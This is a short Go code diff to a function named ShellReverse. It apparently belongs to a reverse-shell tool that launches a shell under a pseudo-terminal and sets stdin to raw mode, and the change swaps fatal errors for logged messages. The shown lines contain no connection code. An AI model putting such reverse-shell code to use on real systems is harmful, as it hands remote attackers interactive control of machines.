@@ -70,7 +70,7 @@ func ShellReverse(host string, shell string) {
 	// Start the command with a pty.
 	ptmx, err := pty.Start(cmd)
 	if err != nil {
-		log.Fatal(err)
+		log.Printf("error starting pty: %s", err)
 	}
 	// Make sure to close the pty at the end.
 	defer func() { _ = ptmx.Close() }() // Best effort.
@@ -91,7 +91,7 @@ func ShellReverse(host string, shell string) {
 	// Set stdin in raw mode.
 	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
 	if err != nil {
-		panic(err)
+		log.Printf("error setting stdin in raw mode: %s", err)
 	}
 	defer func() { _ = term.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.
 
